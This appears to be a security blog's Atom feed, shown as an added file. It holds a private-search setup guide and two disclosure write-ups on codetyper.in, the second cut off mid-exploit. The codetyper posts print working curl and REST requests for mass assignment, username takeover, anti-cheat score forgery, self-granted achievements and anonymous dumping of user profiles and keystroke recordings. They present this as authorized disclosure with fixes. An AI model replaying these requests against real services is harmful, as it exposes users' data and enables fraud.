@@ -1,0 +1,385 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+	<title>btea.dev blog</title>
+	<subtitle>linux, networking, and security research.</subtitle>
+	<link href="https://btea.dev/blog/"/>
+	<link rel="self" href="https://btea.dev/feed.xml"/>
+	<id>https://btea.dev/blog/</id>
+	<updated>2026-08-24T00:00:00Z</updated>
+	<author>
+		<name>btea</name>
+		<email>contact@btea.dev</email>
+	</author>
+
+	<entry>
+		<title>enhancing search privacy</title>
+		<link href="https://btea.dev/blog/searching-privately.html"/>
+		<id>https://btea.dev/blog/searching-privately.html</id>
+		<published>2026-08-24T00:00:00Z</published>
+		<updated>2026-08-24T00:00:00Z</updated>
+		<summary>How I search during security research without telling search engines, my ISP, or the target: self-hosted SearXNG behind a WireGuard kill switch, plus the browser habits that actually matter.</summary>
+		<content type="html">&lt;p class=&quot;post-meta&quot;&gt;&lt;time datetime=&quot;2026-08-24&quot;&gt;August 24, 2026&lt;/time&gt; · ~4 min read&lt;/p&gt;
+
+&lt;h2 id=&quot;the-problem&quot;&gt;&lt;a href=&quot;#the-problem&quot;&gt;#&lt;/a&gt; what we&#x27;re trying to solve&lt;/h2&gt;
+&lt;p&gt;Google. We&#x27;re trying to beat Google at their own game. Google, and every other major search provider, won&#x27;t hesitate to send your search data to advertisers and law enforcement. Imagine you need to search for a very specific string privately: your search provider now knows exactly where that string came from, along with hundreds of fingerprints on you. I&#x27;ve solved these issues for myself, and in this post I&#x27;ll detail my private search setup for protection against adversaries and advertisers. To start, you&#x27;ll need a dedicated Linux server like a &lt;a href=&quot;https://www.raspberrypi.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Raspberry Pi&lt;/a&gt;. I&#x27;m not going to go into depth on setting up a Linux distro like Debian on it, but you really only need Docker and a subscription to a private VPN. This article covers routing a private search aggregator (&lt;a href=&quot;https://docs.searxng.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;SearXNG&lt;/a&gt;) through a VPN provider you trust, like &lt;a href=&quot;https://mullvad.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Mullvad&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-stack&quot;&gt;&lt;a href=&quot;#the-stack&quot;&gt;#&lt;/a&gt; the stack&lt;/h2&gt;
+&lt;p&gt;Everything you need runs on a dedicated Linux server, like a Raspberry Pi.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://docs.searxng.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;SearXNG&lt;/a&gt;&lt;/strong&gt;: a metasearch engine. You type one query, it forwards it to a dozen upstream engines in parallel and merges what comes back. No account, no saved history, no tracking cookies passed through.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/qdm12/gluetun&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Gluetun&lt;/a&gt;&lt;/strong&gt;: a Docker container that&#x27;s basically a WireGuard client with a kill switch baked in. Other containers share its network namespace, so when the tunnel dies they have no internet at all. Nothing leaks out over the home connection &quot;just this once.&quot;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://mullvad.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Mullvad&lt;/a&gt;&lt;/strong&gt;: my VPN provider (it needs to support WireGuard). I use it for the verified no logs claims and privacy stance.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;PSA: Search engines stop profiling you, your ISP only sees encrypted traffic to Mullvad, and a target sees a shared exit IP instead of yours. But Mullvad still sees where you connect, so you&#x27;re moving trust rather than removing it. Good enough against advertisers. This is simply not good enough against a state actor.&lt;/p&gt;
+
+&lt;h2 id=&quot;setup&quot;&gt;&lt;a href=&quot;#setup&quot;&gt;#&lt;/a&gt; setting it up&lt;/h2&gt;
+&lt;p&gt;The main trick is &lt;code&gt;network_mode: &quot;service:gluetun&quot;&lt;/code&gt;. SearXNG doesn&#x27;t get its own network stack, so it can&#x27;t reach the internet except through the tunnel:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;services:
+  gluetun:
+    image: qmcgaw/gluetun
+    cap_add:
+      - NET_ADMIN
+    devices:
+      - /dev/net/tun:/dev/net/tun
+    environment:
+      - VPN_SERVICE_PROVIDER=mullvad
+      - VPN_TYPE=wireguard
+      - WIREGUARD_PRIVATE_KEY=REDACTED
+      - SERVER_COUNTRIES=Netherlands
+    ports:
+      - &quot;8080:8080&quot;   # expose SearXNG&#x27;s port *through* gluetun
+
+  searxng:
+    image: searxng/searxng
+    network_mode: &quot;service:gluetun&quot;
+    volumes:
+      - ./searxng:/etc/searxng&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then in &lt;code&gt;settings.yml&lt;/code&gt;: turn off the engines you don&#x27;t use (I keep DuckDuckGo, Brave, Startpage and Wikipedia), disable SafeSearch, and set &lt;code&gt;public: false&lt;/code&gt; so your instance doesn&#x27;t offer itself up as a public one. Mine only answers on my LAN. Running a public metasearch instance is a different hobby.&lt;/p&gt;
+
+&lt;h2 id=&quot;verification&quot;&gt;&lt;a href=&quot;#verification&quot;&gt;#&lt;/a&gt; proving it works&lt;/h2&gt;
+&lt;p&gt;Test it before you trust it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;docker exec gluetun wget -qO- https://ifconfig.me
+# should output with a mullvad exit IP, not your home&#x27;s public IP.
+
+docker exec gluetun sh -c &#x27;nslookup example.com&#x27;
+#  DNS queries should also resolve through the tunnel&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;habits&quot;&gt;&lt;a href=&quot;#habits&quot;&gt;#&lt;/a&gt; browser habits that matter&lt;/h2&gt;
+&lt;p&gt;The private pipe doesn&#x27;t help if the browser gives you away. Use a privacy hardened Firefox fork like &lt;a href=&quot;https://librewolf.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;LibreWolf&lt;/a&gt; with multi account containers/profiles with no personal logins, and read sensitive results through &lt;a href=&quot;https://archive.ph/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;archive.today&lt;/a&gt; instead of clicking straight to the live site. And keep in mind this is only one step: browser fingerprinting, cookies, account correlation and a hundred other things can deanonymize you on their own.&lt;/p&gt;
+
+&lt;h2 id=&quot;limits&quot;&gt;&lt;a href=&quot;#limits&quot;&gt;#&lt;/a&gt; limits&lt;/h2&gt;
+&lt;p&gt;This is privacy, not anonymity. You&#x27;re shifting trust from your ISP to your VPN provider, who still sees which IPs you talk to. None of it replaces authorization either: whether the target can see you doesn&#x27;t change whether you&#x27;re allowed to test them.&lt;/p&gt;
+&lt;p&gt;What you get is routine recon that looks like noise, no ad profile of everything you&#x27;ve researched, and an accidental click that can&#x27;t burn the session. A few dollars/euros a month and an afternoon of config.&lt;/p&gt;</content>
+	</entry>
+
+	<entry>
+		<title>Still Broken: Re-assessing codetyper.in After Patches</title>
+		<link href="https://btea.dev/blog/codetyper-still-broken.html"/>
+		<id>https://btea.dev/blog/codetyper-still-broken.html</id>
+		<published>2026-06-29T00:00:00Z</published>
+		<updated>2026-06-29T00:00:00Z</updated>
+		<summary>A live re-assessment of codetyper.in after the vendor claimed patches. The admin IDOR was fixed, but almost everything else wasn&#x27;t. New mass-assignment bugs, an anti-cheat bypass via the public bundle formula, and a demonstrated path to #1 on the Python leaderboard in about 3 minutes.</summary>
+		<content type="html">&lt;p class=&quot;post-meta&quot;&gt;&lt;time datetime=&quot;2026-06-29&quot;&gt;June 29, 2026&lt;/time&gt; · codetyper series, part 2 · ~5 min read&lt;/p&gt;
+
+&lt;h2 id=&quot;context&quot;&gt;&lt;a href=&quot;#context&quot;&gt;#&lt;/a&gt; Context&lt;/h2&gt;
+&lt;p&gt;In April 2026 I disclosed a set of critical vulnerabilities in &lt;a href=&quot;https://btea.dev/blog/from-regular-user-to-super-admin.html&quot;&gt;codetyper.in&lt;/a&gt;. The vendor patched the admin IDOR. I came back in late May and late June to see what else stuck. The short version: the admin IDOR stayed fixed. Everything else didn&#x27;t.&lt;/p&gt;
+
+&lt;h2 id=&quot;patch-status&quot;&gt;&lt;a href=&quot;#patch-status&quot;&gt;#&lt;/a&gt; Patch status&lt;/h2&gt;
+&lt;table&gt;
+&lt;tr&gt;&lt;th&gt;Round-1 finding&lt;/th&gt;&lt;th&gt;Patched?&lt;/th&gt;&lt;th&gt;Notes&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Admin IDOR&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;RLS on &lt;code&gt;admins&lt;/code&gt; scoped to &lt;code&gt;auth.uid()&lt;/code&gt;.&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Private profile bypass&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Yes&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;profile_public=false&lt;/code&gt; rows filtered from anon.&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;RLS on &lt;code&gt;profiles&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;No&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;96 full records still served to anon.&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;RLS on &lt;code&gt;sessions&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;No&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;899 records. Now also leaks &lt;code&gt;flag_reason&lt;/code&gt;, &lt;code&gt;moderator_note&lt;/code&gt;.&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;RLS on &lt;code&gt;ghost_recordings&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;No&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;827 keystroke recordings, still joinable to usernames + snippet content.&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Early-access code&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Partially (logic fixed, same code)&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Moved server-side, same code still validates.&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;mass-assign&quot;&gt;&lt;a href=&quot;#mass-assign&quot;&gt;#&lt;/a&gt; Profiles mass assignment&lt;/h2&gt;
+&lt;p&gt;The RLS UPDATE policy on &lt;code&gt;profiles&lt;/code&gt; restricts which &lt;em&gt;rows&lt;/em&gt; you can modify but not which &lt;em&gt;columns&lt;/em&gt;. Any authenticated user can set whatever they want on their own row:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -X PATCH &quot;$SUPA/rest/v1/profiles?id=eq.$MY_ID&quot; \
+  -H &quot;apikey: $KEY&quot; -H &quot;Authorization: Bearer $TOKEN&quot; \
+  -d &#x27;{&quot;is_plus&quot;:true,&quot;is_bot&quot;:true,&quot;longest_streak&quot;:999,
+       &quot;current_streak&quot;:365,&quot;total_sessions&quot;:100}&#x27;
+# HTTP 200 — all values applied&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;is_plus&lt;/code&gt;, &lt;code&gt;is_bot&lt;/code&gt;, streaks, &lt;code&gt;total_sessions&lt;/code&gt;, &lt;code&gt;showcase_achievements&lt;/code&gt;, &lt;code&gt;username&lt;/code&gt; — all directly settable. Free Plus, fake streaks, the username &lt;code&gt;admin&lt;/code&gt; (nobody had claimed it).&lt;/p&gt;
+
+&lt;h2 id=&quot;username&quot;&gt;&lt;a href=&quot;#username&quot;&gt;#&lt;/a&gt; Username takeover&lt;/h2&gt;
+&lt;p&gt;Same column-level gap. You can change your username to any unclaimed string — &lt;code&gt;admin&lt;/code&gt;, &lt;code&gt;support&lt;/code&gt;, &lt;code&gt;moderator&lt;/code&gt; were all available. &lt;code&gt;username_changed_at&lt;/code&gt; didn&#x27;t update after the PATCH, so there&#x27;s no cooldown either.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -X PATCH &quot;$SUPA/rest/v1/profiles?id=eq.$MY_ID&quot; \
+  -H &quot;apikey: $KEY&quot; -H &quot;Authorization: Bearer $TOKEN&quot; \
+  -d &#x27;{&quot;username&quot;:&quot;admin&quot;}&#x27;
+# HTTP 200 — &quot;username&quot;:&quot;admin&quot;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;session-forge&quot;&gt;&lt;a href=&quot;#session-forge&quot;&gt;#&lt;/a&gt; Session forgery&lt;/h2&gt;
+&lt;p&gt;Any authenticated user can POST sessions with forged WPM, accuracy, and score. A server-side trigger checks for score mismatches and sets &lt;code&gt;flagged_for_review: true&lt;/code&gt;, but the session is still inserted and &lt;code&gt;total_sessions&lt;/code&gt; still increments. The anti-cheat formula is in the public bundle:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function QC(nckpm, accuracy, perfect) {
+  return round(nckpm^0.65 * accuracy^1.5 * 17.8 * (perfect ? 1.05 : 1));
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Compute a matching &lt;code&gt;deft_score&lt;/code&gt; and the session passes unflagged:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /rest/v1/sessions
+  {&quot;nckpm&quot;:600, &quot;accuracy&quot;:97.5, &quot;deft_score&quot;:1096, &quot;tier&quot;:&quot;ELITE&quot;}
+  --&gt;  HTTP 201 — not flagged&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Twenty forged sessions later my test account hit &lt;strong&gt;#1 on the Python leaderboard&lt;/strong&gt; with a rolling average of 1027.75 (previous #1 was 961).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../images/blog/leaderboard.png&quot; alt=&quot;#1 position on the codetyper.in Python leaderboard after submitting 20 forged sessions&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; width=&quot;638&quot; height=&quot;714&quot;&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;achievements&quot;&gt;&lt;a href=&quot;#achievements&quot;&gt;#&lt;/a&gt; Self-grant achievements&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;user_achievements&lt;/code&gt; has no RLS on INSERT, and the &lt;code&gt;achievements&lt;/code&gt; table is anon-readable, so every achievement ID is known. Grant yourself whatever:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /rest/v1/user_achievements
+  {&quot;user_id&quot;:&quot;&amp;lt;self&amp;gt;&quot;,&quot;achievement_id&quot;:&quot;speed_80&quot;}
+POST /rest/v1/user_achievements
+  {&quot;user_id&quot;:&quot;&amp;lt;self&amp;gt;&quot;,&quot;achievement_id&quot;:&quot;speed_100&quot;}
+--&amp;gt; HTTP 201 — both granted&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I granted 11 including &lt;code&gt;streak_365&lt;/code&gt;, &lt;code&gt;speed_80&lt;/code&gt;, and &lt;code&gt;speed_100&lt;/code&gt;. They show on the public profile via &lt;code&gt;showcase_achievements&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;profile-result&quot;&gt;&lt;a href=&quot;#profile-result&quot;&gt;#&lt;/a&gt; The result&lt;/h2&gt;
+&lt;p&gt;Combined with the mass-assignment PATCH above, the forged profile looked like this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../images/blog/forged-profile.png&quot; alt=&quot;Forged codetyper.in profile showing Plus badge, 999-day streak, ELITE tier, and all achievements&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; width=&quot;638&quot; height=&quot;704&quot;&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;regressions&quot;&gt;&lt;a href=&quot;#regressions&quot;&gt;#&lt;/a&gt; Still anon-readable&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;profiles&lt;/strong&gt; — 96 records with bio, social handles, streak stats, &lt;code&gt;is_plus&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sessions&lt;/strong&gt; — 899 records. New columns: &lt;code&gt;flagged_for_review&lt;/code&gt;, &lt;code&gt;flag_reason&lt;/code&gt;, &lt;code&gt;moderator_note&lt;/code&gt;. Anyone can see who&#x27;s been flagged and why.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ghost_recordings&lt;/strong&gt; — 827 keystroke-biometric recordings, joinable to &lt;code&gt;profiles(username)&lt;/code&gt; and &lt;code&gt;snippets(content)&lt;/code&gt; in one query.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;curl &quot;$SUPA/rest/v1/ghost_recordings?\
+select=user_id,profiles(username),snippets(content),recording_json&amp;limit=10&quot; \
+  -H &quot;apikey: $KEY&quot;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;chain&quot;&gt;&lt;a href=&quot;#chain&quot;&gt;#&lt;/a&gt; Full chain&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;1. Register account (no email confirmation, no rate limit)
+2. PATCH profiles → is_plus, is_bot, streak=999
+3. POST user_achievements → speed_80, speed_100, anything
+4. Compute matching score from the public formula
+5. POST sessions × 20 → all pass anti-cheat
+6. #1 on the Python leaderboard, Plus, ELITE, 999-day streak, all achievements&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Three minutes of curl.&lt;/p&gt;
+
+&lt;h2 id=&quot;blocked&quot;&gt;&lt;a href=&quot;#blocked&quot;&gt;#&lt;/a&gt; What&#x27;s blocked&lt;/h2&gt;
+&lt;p&gt;The admin IDOR fix is solid. These all fail appropriately:&lt;/p&gt;
+&lt;table&gt;
+&lt;tr&gt;&lt;th&gt;Endpoint&lt;/th&gt;&lt;th&gt;Result&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;INSERT into &lt;code&gt;admins&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;42501&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;SELECT from &lt;code&gt;admins&lt;/code&gt; (other rows)&lt;/td&gt;&lt;td&gt;&lt;code&gt;[]&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;auth/v1/admin/*&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;403 not_admin&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;INSERT into &lt;code&gt;blog_posts&lt;/code&gt;, &lt;code&gt;changelogs&lt;/code&gt;, &lt;code&gt;roadmap_items&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;42501&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;code&gt;ghost_recordings&lt;/code&gt; with foreign &lt;code&gt;user_id&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;403&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;JWTs&lt;/td&gt;&lt;td&gt;ES256, not forgeable&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;fix&quot;&gt;&lt;a href=&quot;#fix&quot;&gt;#&lt;/a&gt; Fix&lt;/h2&gt;
+&lt;p&gt;Postgres RLS is row-level only. Column-level write protection needs either a &lt;code&gt;BEFORE UPDATE&lt;/code&gt; trigger that rejects changes to protected columns (&lt;code&gt;is_plus&lt;/code&gt;, &lt;code&gt;is_bot&lt;/code&gt;, streaks, &lt;code&gt;username&lt;/code&gt;) by non-service-role JWTs, or a &lt;code&gt;SECURITY DEFINER&lt;/code&gt; RPC that only accepts user-editable fields. &lt;code&gt;is_plus&lt;/code&gt; should only be writable by the billing webhook. The anti-cheat should hard-reject mismatches instead of soft-flagging, and &lt;code&gt;ghost_recordings&lt;/code&gt; needs RLS.&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;&lt;a href=&quot;#timeline&quot;&gt;#&lt;/a&gt; Timeline&lt;/h2&gt;
+&lt;table&gt;
+&lt;tr&gt;&lt;th&gt;Date&lt;/th&gt;&lt;th&gt;Breakthrough&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-17&quot;&gt;April 17, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Round 1: check first post for more info :) &lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-19&quot;&gt;April 19, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Round 1 reported to vendor&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-20&quot;&gt;April 20, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Vendor confirms patches&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-21&quot;&gt;April 21, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Round 1 write-up published&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-05-30&quot;&gt;May 30, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Round 2: re-test. Most findings still open.&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-06-25&quot;&gt;June 25, 2026 (resumed after exams)&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Round 3: live demo, #1 on the leaderboard.&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-06-29&quot;&gt;June 29, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Write-up published.&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;tldr&quot;&gt;&lt;a href=&quot;#tldr&quot;&gt;#&lt;/a&gt; TL:DR&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Admin IDOR: fixed.&lt;/li&gt;
+&lt;li&gt;Anon data leaks (profiles, sessions, ghost_recordings): still open. Moderation metadata now exposed too.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;profiles&lt;/code&gt; mass assignment: set &lt;code&gt;is_plus&lt;/code&gt;, streaks, username, &lt;code&gt;is_bot&lt;/code&gt; — whatever you want.&lt;/li&gt;
+&lt;li&gt;Anti-cheat: formula is in the public bundle. Submit matching scores, pass unflagged.&lt;/li&gt;
+&lt;li&gt;I hit #1 on the Python leaderboard in 3 minutes.&lt;/li&gt;
+&lt;li&gt;Fix: column-level write protection, hard-reject mismatches, RLS on &lt;code&gt;ghost_recordings&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr&gt;
+
+&lt;p&gt;&lt;em&gt;All testing performed with authorization. Only throwaway accounts were modified; changes were reverted promptly after disclosure. No other user data was touched. Content disclosure: The development of this specific page was aided with AI tools.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p class=&quot;related&quot;&gt;Related: &lt;a href=&quot;https://btea.dev/blog/from-regular-user-to-super-admin.html&quot;&gt;From Regular User to Super Admin: Hacking codetyper.in&lt;/a&gt; — part 1, where all this started.&lt;/p&gt;</content>
+	</entry>
+	<entry>
+		<title>From Regular User to Super Admin: Hacking codetyper.in</title>
+		<link href="https://btea.dev/blog/from-regular-user-to-super-admin.html"/>
+		<id>https://btea.dev/blog/from-regular-user-to-super-admin.html</id>
+		<published>2026-04-21T00:00:00Z</published>
+		<updated>2026-04-21T00:00:00Z</updated>
+		<summary>A writeup on how I went from curious visitor to full admin access on codetyper.in by exploiting misconfigured RLS policies and an IDOR vulnerability, all starting from a single JS bundle.</summary>
+		<content type="html">&lt;p class=&quot;post-meta&quot;&gt;&lt;time datetime=&quot;2026-04-21&quot;&gt;April 21, 2026&lt;/time&gt; · codetyper series, part 1 · ~5 min read&lt;/p&gt;
+
+&lt;h2 id=&quot;step1&quot;&gt;&lt;a href=&quot;#step1&quot;&gt;#&lt;/a&gt; Step 1: Read the Bundle&lt;/h2&gt;
+&lt;p&gt;I was interested in signing up for the platform, but it required an early access code. I typed in a bogus code and noticed zero network requests. Verification was client-side only. I checked the network tab, saw a 1.2MB JS bundle, and grepped it for the code. Instead, I found Supabase.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;curl -sL &quot;https://codetyper.in/assets/index-[HASH].js&quot; -o bundle.js
+wc -c bundle.js
+# ~1.2 MB in size
+
+# Supabase project URL
+grep -oP &#x27;const PS=&quot;[^&quot;]+&quot;&#x27; bundle.js
+# Output: const PS=&quot;https://saqel...&quot;
+
+# Anon key (public, but opens the DB door)
+grep -oP &#x27;sb_publishable_[^&quot;]+&#x27; bundle.js
+# Output: sb_publishable_7uDF...
+
+# Tables referenced in client queries
+grep -oP &#x27;U\.from\(&quot;[^&quot;]+&quot;\)&#x27; bundle.js | sort -u
+# U.from(&quot;admins&quot;)
+# U.from(&quot;blog_posts&quot;)
+# U.from(&quot;changelogs&quot;)
+# U.from(&quot;ghost_recordings&quot;)
+# U.from(&quot;keystroke_events&quot;)
+# U.from(&quot;leaderboard_entries&quot;)
+# U.from(&quot;profiles&quot;)
+# U.from(&quot;sessions&quot;)
+# ...&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Reward:&lt;/strong&gt; Supabase URL, anon key, and a full table map.&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;step2&quot;&gt;&lt;a href=&quot;#step2&quot;&gt;#&lt;/a&gt; Step 2: Dump the Database (No Auth Required)&lt;/h2&gt;
+&lt;p&gt;With the anon key, I queried tables that should have required authentication.&lt;/p&gt;
+
+&lt;h3&gt;Profiles Table&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;curl -sL &quot;https://saqel.../rest/v1/profiles?select=*&quot; \
+  -H &quot;apikey: sb_publishable_7uDF...&quot;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Output (truncated):&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[
+  {&quot;id&quot;:&quot;d.3c8cb9-...&quot;,&quot;username&quot;:&quot;iamdark...&quot;,&quot;profile_public&quot;:true},
+  {&quot;id&quot;:&quot;c6e.7863-...&quot;,&quot;username&quot;:&quot;ragecod...&quot;,&quot;profile_public&quot;:true},
+  {&quot;id&quot;:&quot;1.9f3e9e-...&quot;,&quot;username&quot;:&quot;m.as....&quot;,&quot;profile_public&quot;:false},
+  ... 50 more records
+]&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt; All 53 user profiles returned, including users with &lt;code&gt;profile_public=false&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3&gt;Sessions Table&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;curl -sL &quot;https://saqel.../rest/v1/sessions?select=*&amp;limit=2&quot; \
+  -H &quot;apikey: sb_publishable_7uDF...&quot;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[
+  {&quot;id&quot;:&quot;ff5eaf89-...&quot;,&quot;user_id&quot;:&quot;bef5f...&quot;,&quot;gross_wpm&quot;:158.0,
+   &quot;accuracy&quot;:13.8,&quot;deft_score&quot;:8.0,&quot;duration_ms&quot;:45134},
+  ...
+]&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Returned user IDs, WPM, accuracy, and duration. These user IDs enabled the IDOR attack in Step 4.&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;step3&quot;&gt;&lt;a href=&quot;#step3&quot;&gt;#&lt;/a&gt; Step 3: Identify an Admin&lt;/h2&gt;
+&lt;p&gt;The &lt;code&gt;admins&lt;/code&gt; table itself had RLS enabled, but the leaked &lt;code&gt;profiles&lt;/code&gt; data gave enough metadata to infer admin identities based on activity patterns and account age. From the profile dump, I extracted a high-confidence admin user ID.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Admin user ID: f1f55801-...&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My own test account (now deleted):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Attacker user ID: ed1a1746-...&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;step4&quot;&gt;&lt;a href=&quot;#step4&quot;&gt;#&lt;/a&gt; Step 4: IDOR, the path to becoming an admin&lt;/h2&gt;
+&lt;p&gt;The app checks admin privileges client-side like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;U.from(&quot;admins&quot;).select(&quot;*&quot;).eq(&quot;user_id&quot;, r.user.id).maybeSingle()&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It queries the &lt;code&gt;admins&lt;/code&gt; table using the user ID from the Supabase session object. The problem: &lt;strong&gt;the app trusts the client-supplied user ID without server-side validation.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3&gt;The Exploit&lt;/h3&gt;
+&lt;ol&gt;
